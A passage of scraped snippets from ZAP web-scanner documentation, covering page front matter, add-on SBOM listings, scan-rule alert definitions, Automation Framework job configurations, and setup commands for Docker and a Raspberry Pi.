LANGUAGE: yaml
CODE:
scan: Starts an Access Control scan\nParameters:\n- context ID\n- user ID (comma separated)\n- includeUnauthenticated (boolean, default false)\n- raiseAlerts (boolean, default true)\n- alertRiskLevel (default High)\n\nwriteHTMLreport: Generates an Access Control report\nParameters:\n- context ID\n- filename\n\ngetScanProgress: Gets scan progress percentage\nParameters:\n- context ID\n\ngetScanStatus: Gets scan status description\nParameters:\n- context ID

----------------------------------------

TITLE: Configuring ZAP Automation Links in YAML
DESCRIPTION: YAML configuration file defining the navigation links and descriptions for different ZAP automation methods. Includes front matter configuration for a documentation page.

LANGUAGE: yaml
CODE:
title: "Automate ZAP"
type: page
layout: links
links:
  - name: 'ZAPit'
    link: /blog/2023-10-18-zapit/
    desc: a quick 'reconnaissance' scan of the URL specified

  - name: 'Quick Start command line'
    link: /docs/desktop/addons/quick-start/cmdline/
    desc: easy to run, but with very limited options so only suitable for simple scans

  - name: 'Docker Packaged Scans'
    link: /docs/docker/
    desc: the easiest way to get started with ZAP automation with lots of flexibility

  - name: 'GitHub Actions'
    link: https://github.com/marketplace?query=zap&verification=verified_creator
    desc: the associated packaged scans available on the GitHub Marketplace

  - name: 'Automation Framework'
    link: automation-framework/
    desc: a flexible option not tied to any container technology - recommended for most non-trivial automation

  - name: 'API and Daemon mode'
    link: /docs/api/
    desc: for full control over ZAP via a comprehensive API
cascade:
  EditableContent: true

----------------------------------------

TITLE: Alert Configuration YAML for PHP Source Code Disclosure
DESCRIPTION: YAML configuration for a ZAP passive scan rule that detects exposed PHP source code. Includes alert metadata like ID, risk level, solution guidance, and vulnerability mappings to CWE and WASC.

LANGUAGE: yaml
CODE:
title: "Source Code Disclosure - PHP"
alertid: 10099
alertindex: 1009900
alerttype: "Passive"
alertcount: 1
status: beta
type: alert
risk: Medium
solution: "Ensure that application Source Code is not available with alternative extensions, and ensure that source code is not present within other files or data deployed to the web server, or served by the web server."
references:
   - https://www.wsj.com/articles/BL-CIOB-2999
other: ""
cwe: 540
wasc: 13
alerttags: 
  - CWE-540
  - OWASP_2017_A06
  - OWASP_2021_A05
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrulesBeta/src/main/java/org/zaproxy/zap/extension/pscanrulesBeta/SourceCodeDisclosureScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrulesBeta/SourceCodeDisclosureScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/passive-scan-rules-beta/#id-10099

----------------------------------------

TITLE: Markdown Table of ZAP Package Maintainers
DESCRIPTION: A table listing various third-party packages for ZAP, including links to the packages, maintainer information, and update instructions for each distribution platform.

LANGUAGE: markdown
CODE:
| Package                                                                                            | Instructions                                                                                              |
|:---------------------------------------------------------------------------------------------------|:-------------------------------------------------------------------------------------------------------------|
| [BackBox](https://www.backbox.org/)                                                                | Maintained by [@raffaele_forte](https://twitter.com/raffaele_forte)                                       |
| [Brew](https://formulae.brew.sh/cask/zap)                                                          | Submit a PR on [zap-rb](https://github.com/Homebrew/homebrew-cask/blob/master/Casks/z/zap.rb) |
| [Chocolatey](https://community.chocolatey.org/packages/zap)                                        | Raise an issue on [chocolatey-packages](https://github.com/jtcmedia/chocolatey-packages)                 |
| [Flathub](https://flathub.org/apps/details/org.zaproxy.ZAP)                                        | Submit a PR on [ZAP](https://github.com/flathub/org.zaproxy.ZAP)                                          |
| [FreeBSD](https://www.freshports.org/security/zaproxy/)                                            | Maintained by [Alonso Cárdenas](mailto:acm@FreeBSD.org)                                          |
| [Kali](https://www.kali.org/tools/zaproxy/)                                                        | Raise a new issue on the [Kali Linux Bug Tracker](https://bugs.kali.org/my_view_page.php)                  |
| [Linux repos](https://software.opensuse.org/download.html?project=home%3Acabelo&package=zap)       | Maintained by [Cabelo](https://en.opensuse.org/User:Cabelo) on behalf of the ZAP Core Team       |
| [OpenSUSE](https://build.opensuse.org/package/show/security/owasp-zap)                             | Raise a Request on that page            |
| [Scoop](https://github.com/lukesampson/scoop-extras/blob/master/bucket/zaproxy.json)               | Submit a PR on [zaproxy.json](https://github.com/ScoopInstaller/Extras/blob/master/bucket/zaproxy.json) |

----------------------------------------

TITLE: Example File-Based Active Scan Rule in Java
DESCRIPTION: Implements an example active scan rule that loads test strings from an editable file. Used to demonstrate custom scan rule implementation.

LANGUAGE: Java
CODE:
ExampleFileActiveScanRule.java

----------------------------------------

TITLE: Simple DoS Active Scan Rule in Java
DESCRIPTION: Implements a basic example active scan rule for detecting potential denial of service vulnerabilities.

LANGUAGE: Java
CODE:
ExampleSimpleActiveScanRule.java

----------------------------------------

TITLE: Defining Additional Poll Request Headers in ZAP
DESCRIPTION: Example of how to specify additional headers for authentication poll requests, including Content-Type and X-Requested-With headers.

LANGUAGE: plaintext
CODE:
Content-Type: application/json
X-Requested-With: XMLHttpRequest

----------------------------------------

TITLE: Initializing YAML Frontmatter
DESCRIPTION: YAML configuration metadata for the documentation page specifying the add-on ID, version and other properties.

LANGUAGE: yaml
CODE:
title: Selenium
type: userguide
weight: 1
cascade:
  addon:
    id: selenium
    version: 15.35.0

----------------------------------------

TITLE: Implementing Sec-Fetch-Dest Header Validation in Java for ZAP
DESCRIPTION: This code snippet is part of a ZAP extension that implements a passive scan rule to check for invalid Sec-Fetch-Dest header values. It's located in the FetchMetadataRequestHeadersScanRule.java file and is responsible for validating the header against a list of allowed values.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrulesAlpha/src/main/java/org/zaproxy/zap/extension/pscanrulesAlpha/FetchMetadataRequestHeadersScanRule.java

----------------------------------------

TITLE: YAML Configuration for Requester Add-on SBOM
DESCRIPTION: YAML frontmatter and component listing that defines the Software Bill of Materials for the Requester add-on. Lists all dependencies with their versions and licenses.

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: Requester Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: requester
    version: 7.8.0
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/requester-v7.8.0/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain

----------------------------------------

TITLE: Importing Data Files in ZAP Automation Framework
DESCRIPTION: Job configuration for importing data from HAR files, ModSecurity2 logs, URLs, or ZAP messages. Requires specifying the import type and source file name.

LANGUAGE: yaml
CODE:
  - type: import                       # Import a file of requests
    parameters:
      type:                            # String: One of ['har', 'modsec2', 'url', 'zap_messages']
      fileName:                        # String: Name of the file containing the data

----------------------------------------

TITLE: Defining YAML Front Matter for Authentication Decision Tree Page
DESCRIPTION: This YAML code defines the front matter for a Hugo page that represents the starting point of an authentication decision tree for ZAP configuration. It specifies the page title, type, layout, and the initial question with possible answers and their corresponding links.

LANGUAGE: yaml
CODE:
---
title: "Authentication Decision Tree"
type: page
layout: decision-question
question: Does your app have a login page?
answers:
- answer: 'Yes'
  link: run-auth-tester/
- answer: 'No'
  link: what-app-type/
cascade:
  EditableContent: true
  addBreadcrumbs: true
---

----------------------------------------

TITLE: Web Cache Deception Scanner in Java
DESCRIPTION: Tests for Web Cache Deception vulnerabilities by appending static paths to URIs and checking for information leakage. Requires authenticated user.

LANGUAGE: Java
CODE:
WebCacheDeceptionScanRule.java

----------------------------------------

TITLE: Docker Image Registry Mapping
DESCRIPTION: A markdown table showing the mapping between DockerHub and GitHub Container Registry (GHCR) image tags for different ZAP Docker variants including stable, bare, weekly, and nightly builds.

LANGUAGE: markdown
CODE:
| DockerHub                             | GHCR                                      |
| ------------------------------------- | ----------------------------------------- |
| `owasp/zap2docker-stable:latest`      | `ghcr.io/zaproxy/zaproxy:latest`          |
| `owasp/zap2docker-stable:latest`      | `ghcr.io/zaproxy/zaproxy:stable`          |
| `owasp/zap2docker-stable:2.12.0`      | `ghcr.io/zaproxy/zaproxy:2.12.0`          |
| `owasp/zap2docker-stable:s2023-06-09` | `ghcr.io/zaproxy/zaproxy:20230609-stable` |
| &nbsp;                                |                                           |
| `owasp/zap2docker-bare:latest`        | `ghcr.io/zaproxy/zaproxy:bare`            |
| `owasp/zap2docker-bare:2.12.0`        | `ghcr.io/zaproxy/zaproxy:2.12.0-bare`     |
| `owasp/zap2docker-bare:b2023-06-09`   | `ghcr.io/zaproxy/zaproxy:20230609-bare`   |
| &nbsp;                                |                                           |
| `owasp/zap2docker-weekly:latest`      | `ghcr.io/zaproxy/zaproxy:weekly`          |
| `owasp/zap2docker-weekly:w2023-06-12` | `ghcr.io/zaproxy/zaproxy:20230612-weekly` |
| &nbsp;                                |                                           |
| `owasp/zap2docker-live:latest`        | `ghcr.io/zaproxy/zaproxy:nightly`         |

----------------------------------------

TITLE: Installing Desktop Environment on Raspberry Pi
DESCRIPTION: Commands to install X server, LXDE desktop environment and required components for GUI support

LANGUAGE: bash
CODE:
sudo apt update && sudo apt upgrade && sudo apt install xserver-xorg-core xserver-xorg-video-fbdev xserver-xorg-input-evdev xinit xfonts-base lxde  --no-install-recommends -y

LANGUAGE: bash
CODE:
echo 'exec startlxde' > ~/.xinitrc

----------------------------------------

TITLE: YAML Configuration for Passive Scanner Rules (Beta) Add-on SBOM
DESCRIPTION: YAML configuration defining metadata and component list for the Passive Scanner Rules (Beta) Add-on SBOM. It specifies the add-on ID, version, SBOM format, download URL, and a comprehensive list of components with their names, versions, and licenses.

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: Passive scanner rules (beta) Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: pscanrulesBeta
    version: '43'
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/pscanrulesBeta-v43/bom.json
  components:
  - name: apiguardian-api
    version: 1.1.2
    licenses: Apache-2.0
  - name: asm
    version: '9.7'
    licenses: BSD-3-Clause
  # ... [additional components omitted for brevity]
  - name: zap
    version: 2.16.0
    licenses: Apache-2.0

----------------------------------------

TITLE: Importing API Definitions using Python API Client
DESCRIPTION: Shows how to import SOAP and OpenAPI definitions using ZAP's Python API client, supporting both local file and URL imports.

LANGUAGE: python
CODE:
print zap._request(  
  zap.base + 'openapi/action/importFile/',  
  {'file':'/home/user/openapi.json'})  
 
print zap._request(  
  zap.base + 'openapi/action/importUrl/',  
  {'url':'https://localhost/openapi.json'})  
 
print zap._request(  
  zap.base + 'soap/action/importFile/',  
  {'file':'/home/user/soap.xml'})  
 
print zap._request(  
  zap.base + 'soap/action/importUrl/',  
  {'url':'https://localhost/soap.xml'})

----------------------------------------

TITLE: Configuring YAML Frontmatter for TLS Debug Add-on Documentation
DESCRIPTION: This YAML snippet defines the frontmatter for a documentation page about the TLS Debug add-on. It specifies the title, type, weight, and cascade properties for the page, including the add-on ID and version.

LANGUAGE: yaml
CODE:
---
# This page was generated from the add-on.
title: TLS Debug
type: userguide
weight: 1
cascade:
  addon:
    id: tlsdebug
    version: 5.0.0
---

----------------------------------------

TITLE: Defining XSLT Injection Alert Configuration
DESCRIPTION: YAML configuration block defining the properties of the XSLT injection security scanner alert, including risk level, solution guidance, and associated security standards like CWE and WASC.

LANGUAGE: yaml
CODE:
title: "XSLT Injection"
alertid: 90017
alertindex: 9001700
alerttype: "Active"
alertcount: 1
status: release
type: alert
risk: Medium
solution: "Sanitize and analyze every user input coming from any client-side."
references:
   - https://www.contextis.com/blog/xslt-server-side-injection-attacks
other: "The response to sending an XSLT token included error messages that may indicate a vulnerability to XSLT injections."
cwe: 91
wasc: 23
alerttags: 
  - CWE-91
  - OWASP_2017_A01
  - OWASP_2021_A03
  - POLICY_API
  - POLICY_DEV_CICD
  - POLICY_DEV_FULL
  - POLICY_DEV_STD
  - POLICY_QA_FULL
  - POLICY_QA_STD
  - POLICY_SEQUENCE

----------------------------------------

TITLE: Defining SBOM Metadata in YAML
DESCRIPTION: This YAML snippet defines metadata for the Retest Add-on's Software Bill of Materials, including the add-on ID, version, SBOM format, and download URL.

LANGUAGE: yaml
CODE:
title: Retest Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: retest
    version: 0.11.0
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/retest-v0.11.0/bom.json

----------------------------------------

TITLE: Referencing Tech Detection Alert ID
DESCRIPTION: Provides a link to the documentation for the specific alert ID associated with technology detection in ZAP.

LANGUAGE: markdown
CODE:
Alert ID: [10004](/docs/alerts/10004/)

----------------------------------------

TITLE: Sending HTTP Request Using sender Object (BeanShell)
DESCRIPTION: This snippet shows how to use the pre-initialized 'sender' object to send an HTTP GET request. It demonstrates direct interaction with ZAP's HTTP sending functionality from within the BeanShell Console.

LANGUAGE: beanshell
CODE:
msg = sender.sendAndReceive(new HttpMessage(new URI("http://localhost/", true)), true);
print(msg.getResponseHeader());
print(msg.getResponseBody().toString());

----------------------------------------

TITLE: Configuring Client Script Authentication in ZAP Automation Framework (YAML)
DESCRIPTION: This YAML snippet demonstrates how to configure Client Script Authentication in the environment section of a ZAP Automation Framework plan. It specifies the authentication method as 'client' and provides parameters for the script path and script engine.

LANGUAGE: yaml
CODE:
      authentication:
        method: "client"
        parameters:
          script: /path/to/RecordedAuth.zst  # String, the path to the Zest login script
          scriptEngine: Mozilla Zest         # The script engine used for the login script

----------------------------------------

TITLE: Authentication Helper Add-on SBOM Configuration
DESCRIPTION: YAML configuration file defining the metadata and complete dependency list for the Authentication Helper Add-on's Software Bill of Materials (SBOM).

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: Authentication Helper Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: authhelper
    version: 0.23.0
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/authhelper-v0.23.0/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain

----------------------------------------

TITLE: Configuring JavaFX JVM Arguments for ZAP
DESCRIPTION: JVM arguments required to enable JavaFX functionality in ZAP. These arguments specify the JavaFX module path and required modules for the Browser View add-on to function.

LANGUAGE: bash
CODE:
--module-path /path/to/javafx/lib/ --add-modules javafx.swing,javafx.web

----------------------------------------

TITLE: Installing VNC Server on Raspberry Pi
DESCRIPTION: Commands to install and configure TightVNC server for remote access to the Raspberry Pi

LANGUAGE: bash
CODE:
sudo apt update

LANGUAGE: bash
CODE:
sudo apt install tightvncserver

LANGUAGE: bash
CODE:
sudo tightvncserver

----------------------------------------

TITLE: YAML Front Matter Configuration
DESCRIPTION: Configuration metadata for the documentation page, including add-on ID and version information.

LANGUAGE: yaml
CODE:
title: Windows WebDrivers
type: userguide
weight: 1
cascade:
  addon:
    id: webdriverwindows
    version: 129.0.0

----------------------------------------

TITLE: Alert Configuration in YAML Frontmatter
DESCRIPTION: YAML configuration block defining the alert properties including ID, type, risk level, solution guidance, and related security standards references

LANGUAGE: yaml
CODE:
title: "Application Error Disclosure"
alertid: 90022
alertindex: 9002200
alerttype: "Passive"
alertcount: 1
status: release
type: alert
risk: Medium
solution: "Review the source code of this page. Implement custom error pages. Consider implementing a mechanism to provide a unique error reference/identifier to the client (browser) while logging the details on the server side and not exposing them to the user."
other: ""
cwe: 550
wasc: 13
alerttags: 
  - CUSTOM_PAYLOADS
  - CWE-550
  - OWASP_2017_A06
  - OWASP_2021_A05
  - WSTG-v42-ERRH-01
  - WSTG-v42-ERRH-02

----------------------------------------

TITLE: Defining SBOM Metadata in YAML
DESCRIPTION: This YAML snippet defines metadata for the Software Bill of Materials (SBOM) of the OAST Support Add-on. It specifies the add-on ID, version, SBOM format, and download URL.

LANGUAGE: yaml
CODE:
title: OAST Support Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: oast
    version: 0.21.0
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/oast-v0.21.0/bom.json

----------------------------------------

TITLE: Referencing Tech Detection Passive Scanner Java Implementation
DESCRIPTION: Provides a link to the latest Java source code for the TechPassiveScanner class, which implements the technology detection functionality in ZAP.

LANGUAGE: markdown
CODE:
Latest code: [TechPassiveScanner.java](https://github.com/zaproxy/zap-extensions/blob/main/addOns/wappalyzer/src/main/java/org/zaproxy/zap/extension/wappalyzer/TechPassiveScanner.java)

----------------------------------------

TITLE: YAML Frontmatter for Active Scanner Rules (Alpha) Add-on SBOM
DESCRIPTION: This YAML frontmatter defines metadata for the SBOM page, including title, type, weight, and addon information. It also specifies the SBOM format, download URL, and lists all components with their names, versions, and licenses.

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: Active scanner rules (alpha) Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: ascanrulesAlpha
    version: '48'
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/ascanrulesAlpha-v48/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain
  - name: apiguardian-api
    version: 1.1.2
    licenses: Apache-2.0
  # ... [additional components omitted for brevity]
  - name: zap
    version: 2.15.0
    licenses: Apache-2.0

----------------------------------------

TITLE: Configuring Header Based Session Management in Automation Framework (YAML)
DESCRIPTION: Example configuration for Header Based Session Management in ZAP's Automation Framework. Shows how to specify session management method and header parameters with token substitution.

LANGUAGE: yaml
CODE:
      sessionManagement:
        method: "headers"
        parameters:                    #  list of header: value pairs which can include any of the tokens defined above, e.g.
          Authorization: "Bearer: {%json:AuthenticationResult.AccessToken%}"

----------------------------------------

TITLE: Defining YAML Frontmatter for Automation Framework Add-on SBOM
DESCRIPTION: This YAML frontmatter defines metadata for the Automation Framework Add-on's Software Bill of Materials (SBOM). It includes the add-on ID, version, SBOM format, download URL, and a comprehensive list of components with their names, versions, and licenses.

LANGUAGE: yaml
CODE:
---
# This page was automatically generated from the add-on's SBOM.
title: Automation Framework Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: automation
    version: 0.48.0
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/automation-v0.48.0/bom.json
  components:
  - name: apiguardian-api
    version: 1.1.2
    licenses: Apache-2.0
  - name: asm
    version: '9.7'
    licenses: BSD-3-Clause
  # ... [Additional components omitted for brevity]
  - name: zap
    version: 2.16.0
    licenses: Apache-2.0
---

----------------------------------------

TITLE: Logging Configuration in ZAProxy using Log4j
DESCRIPTION: Example of obtaining a logger instance using the updated Log4j 2.x API, which replaces the previous logging implementation. Shows the recommended way to initialize logging in ZAProxy code.

LANGUAGE: java
CODE:
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

// ...

Logger logger = LogManager.getLogger(MyClass.class);

----------------------------------------

TITLE: Defining YAML Front Matter for ZAP Documentation Page
DESCRIPTION: This YAML code defines the front matter for a ZAP documentation page. It sets the title, page type, layout, and includes links to further documentation on automation and authentication. The cascade property sets EditableContent to true for child pages.

LANGUAGE: yaml
CODE:
---
title: "Getting Further"
type: page
layout: links
links:

  - name: 'Getting Further With Automation'
    link: /docs/getting-further/automation/
    desc: an in-depth guide to ZAP automation

  - name: 'Getting Further With Authentication'
    link: /docs/getting-further/authentication/
    desc: everything you need to know about authentication in ZAP

cascade:
  EditableContent: true
---

----------------------------------------

TITLE: Listing SBOM Components in YAML
DESCRIPTION: This YAML snippet lists the components used in the Dev Add-on, including their names, versions, and licenses. It's a comprehensive list of all dependencies.

LANGUAGE: yaml
CODE:
components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain
  - name: apiguardian-api
    version: 1.1.2
    licenses: Apache-2.0
  # ... [truncated for brevity]
  - name: zap
    version: 2.16.0
    licenses: Apache-2.0

----------------------------------------

TITLE: Specifying ZAP Docker Image Source in Markdown
DESCRIPTION: Markdown snippet providing information about the new location of ZAP Docker images on Docker Hub and GitHub Container Registry.

LANGUAGE: markdown
CODE:
[Software Security Project Docker Hub Organisation](https://hub.docker.com/u/softwaresecurityproject)

LANGUAGE: markdown
CODE:
[GitHub Container Registry](https://github.com/zaproxy/zaproxy/pkgs/container/zaproxy/versions?filters%5Bversion_type%5D=tagged)

----------------------------------------

TITLE: Implementing Verification Request Detection in ZAP
DESCRIPTION: This code snippet represents the implementation of the VerificationDetectionScanRule in ZAP. It's responsible for identifying and handling verification requests used to validate session authenticity.

LANGUAGE: java
CODE:
VerificationDetectionScanRule.java

----------------------------------------

TITLE: Defining YAML Frontmatter for Common Library Add-on SBOM
DESCRIPTION: This YAML frontmatter defines metadata for the Common Library Add-on SBOM page, including title, type, weight, and cascade information for the add-on ID and version.

LANGUAGE: yaml
CODE:
---
# This page was automatically generated from the add-on's SBOM.
title: Common Library Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: commonlib
    version: 1.30.0
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/commonlib-v1.30.0/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain
  # ... (truncated for brevity)
  - name: zap
    version: 2.16.0-SNAPSHOT
    licenses: Apache-2.0
---

----------------------------------------

TITLE: Detecting JWTs in Browser Storage with Java
DESCRIPTION: This rule scans for JWTs stored in browser localStorage and sessionStorage. It raises informational alerts for sessionStorage and medium alerts for localStorage. Alerts are raised once per URL and storage key combination.

LANGUAGE: Java
CODE:
JwtInStorageScanRule.java

----------------------------------------

TITLE: Example URL Structures in ZAP Sites Tree
DESCRIPTION: Sample URL patterns showing how ZAP groups requests into tree nodes based on HTTP methods and parameters. Different parameter names create unique nodes while different parameter values share the same node.

LANGUAGE: plaintext
CODE:
GET https://www.example.com/ex1?a=b&c=d
GET https://www.example.com/ex1?a=b&d=c
POST https://www.example.com/ex1?a=b&c=d

----------------------------------------

TITLE: Configuring Page Redirect in YAML Frontmatter
DESCRIPTION: YAML frontmatter configuration that defines a page title, layout type, redirect destination, and cascade settings for editable content.

LANGUAGE: yaml
CODE:
---
title: Guides
layout: redirect
redirect: /docs/
cascade:
  EditableContent: true
---

----------------------------------------

TITLE: YAML Configuration for ZAP Scan Policies SBOM
DESCRIPTION: YAML front matter configuration defining metadata and component dependencies for the ZAP Scan Policies add-on. Includes addon identification, version information, and a detailed list of dependencies with their respective versions and licenses.

LANGUAGE: yaml
CODE:
title: Scan Policies Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: scanpolicies
    version: 0.2.0
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/scanpolicies-v0.2.0/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain

----------------------------------------

TITLE: Environment Variable Reference
DESCRIPTION: Reference to ZAP_SILENT environment variable that can be used to disable call home requests.

LANGUAGE: markdown
CODE:
\`ZAP_SILENT\`

----------------------------------------

TITLE: YAML Configuration for Directory List v1.0 Add-on SBOM
DESCRIPTION: This YAML configuration defines metadata for the Directory List v1.0 Add-on SBOM page, including title, type, weight, and cascade information. It also specifies the SBOM format, download URL, and lists all components with their names, versions, and licenses.

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: Directory List v1.0 Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: directorylistv1
    version: '9'
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/directorylistv1-v9/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain
  - name: asm
    version: '9.6'
    licenses: BSD-3-Clause
  # ... [additional components omitted for brevity]
  - name: zap
    version: 2.16.0-SNAPSHOT
    licenses: Apache-2.0

----------------------------------------

TITLE: Configuring exitStatus Job in YAML for ZAP Automation Framework
DESCRIPTION: This YAML configuration defines the exitStatus job parameters. It allows setting error and warn levels, as well as customizing exit values for OK, error, and warning scenarios. The job sets ZAP's exit code based on scan results and specified thresholds.

LANGUAGE: yaml
CODE:
  - type: exitStatus                   # Sets the exit code based on scan results
    parameters:
      errorLevel:                      # String: Informational, Low, Medium, High, default: not set
      warnLevel:                       # String: Informational, Low, Medium, High, default: not set
      okExitValue:                     # Integer: Exit value if all ok, default 0
      errorExitValue:                  # Integer: Exit value if there are errors, default 1
      warnExitValue:                   # Integer: Exit value if there are warnings, default 2

----------------------------------------

TITLE: Online Menus Add-on SBOM Configuration in YAML
DESCRIPTION: YAML configuration defining the SBOM metadata and component dependencies for the Online Menus add-on. Lists all software components with their versions and associated licenses.

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: Online menus Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: onlineMenu
    version: '14'
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/onlineMenu-v14/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain
  - name: asm
    version: '9.6'
    licenses: BSD-3-Clause
  - name: asm-commons
    version: '9.6'
    licenses: BSD-3-Clause

----------------------------------------

TITLE: Markdown Front Matter Configuration
DESCRIPTION: YAML front matter configuration for the documentation page defining title, type and weight parameters.

LANGUAGE: yaml
CODE:
---
# This page was generated from the add-on.
title: Request tab
type: userguide
weight: 2
---

----------------------------------------

TITLE: Defining YAML Frontmatter for Active Scanner Rules (Beta) Add-on SBOM
DESCRIPTION: This YAML frontmatter defines metadata for the SBOM page, including title, type, weight, and add-on information. It also specifies the SBOM format and download URL.

LANGUAGE: yaml
CODE:
---
# This page was automatically generated from the add-on's SBOM.
title: Active scanner rules (beta) Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: ascanrulesBeta
    version: '58'
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/ascanrulesBeta-v58/bom.json
  components:
  - name: apiguardian-api
    version: 1.1.2
    licenses: Apache-2.0
  # ... (truncated for brevity)
  - name: zap
    version: 2.16.0
    licenses: Apache-2.0
---

----------------------------------------

TITLE: Defining YAML Front Matter for Linux WebDrivers Add-on SBOM
DESCRIPTION: This YAML block defines metadata and component information for the Linux WebDrivers Add-on SBOM. It includes the add-on ID, version, and a comprehensive list of components with their respective versions and licenses.

LANGUAGE: yaml
CODE:
---
# This page was automatically generated from the add-on's SBOM.
title: Linux WebDrivers Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: webdriverlinux
    version: '129'
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/webdriverlinux-v129/bom.json
  components:
  - name: asm
    version: '9.7'
    licenses: BSD-3-Clause
  - name: asm-commons
    version: '9.7'
    licenses: BSD-3-Clause
  # ... [truncated for brevity]
  - name: zap
    version: 2.16.0
    licenses: Apache-2.0
---

----------------------------------------

TITLE: YAML Front Matter Configuration
DESCRIPTION: YAML configuration block defining document metadata including title, type and weight.

LANGUAGE: yaml
CODE:
---
title: Release 2.13.0
type: userguide
weight: 4
---

----------------------------------------

TITLE: Configuring Passive Scan Wait Job in YAML
DESCRIPTION: YAML configuration for the passiveScan-wait job that waits for passive scanner completion. Includes maxDuration parameter to set maximum wait time, defaulting to unlimited if set to 0.

LANGUAGE: yaml
CODE:
  - type: passiveScan-wait             # Passive scan wait for the passive scanner to finish
    parameters:
      maxDuration: 5                   # Int: The max time to wait for the passive scanner, default: 0 unlimited

----------------------------------------

TITLE: Defining YAML Frontmatter for Parameter Digger Add-on SBOM
DESCRIPTION: This YAML frontmatter defines metadata for the Parameter Digger Add-on SBOM page, including title, type, weight, and cascade information. It also specifies the SBOM format, download URL, and lists all components with their names, versions, and licenses.

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: Parameter Digger Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: paramdigger
    version: 0.3.0
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/paramdigger-v0.3.0/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain
  - name: apiguardian-api
    version: 1.1.2
    licenses: Apache-2.0
  # ... [truncated for brevity]
  - name: zap
    version: 2.15.0
    licenses: Apache-2.0

----------------------------------------

TITLE: YAML Frontmatter Configuration for ZAP Documentation
DESCRIPTION: YAML configuration block that defines metadata for the ZAP documentation page, including title, type, weight and addon information.

LANGUAGE: yaml
CODE:
---
# This page was generated from the add-on.
title: The ZAP by Checkmarx Desktop User Guide
type: userguide
weight: 1
cascade:
  addon:
    id: help
    version: 19.0.0
---

----------------------------------------

TITLE: Running ZAP in Headless Mode with Docker
DESCRIPTION: Command to start ZAP in headless mode within a Docker container, exposing the API for connections.

LANGUAGE: bash
CODE:
docker run -u zap -p 8080:8080 -i zaproxy/zap-stable zap.sh -daemon -host 0.0.0.0 -port 8080 -config api.addrs.addr.name=.* -config api.addrs.addr.regex=true -config api.key=<api-key>

----------------------------------------

TITLE: Defining SBOM Metadata in YAML
DESCRIPTION: This YAML snippet defines metadata for the SBOM, including the add-on ID, version, SBOM format, and download URL.

LANGUAGE: yaml
CODE:
title: Dev Add-on Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: dev
    version: 0.9.0
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/dev-v0.9.0/bom.json
  components:

----------------------------------------

TITLE: Configuring Image Location Scanner SBOM in YAML
DESCRIPTION: YAML configuration file defining metadata and component dependencies for the Image Location Scanner ZAP add-on. Includes component details like name, version and license information in CycloneDX format.

LANGUAGE: yaml
CODE:
title: Image Location and Privacy Scanner Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: imagelocationscanner
    version: '5'
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/imagelocationscanner-v5/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain

----------------------------------------

TITLE: Setting CA Certificate Commands in ZAP CLI
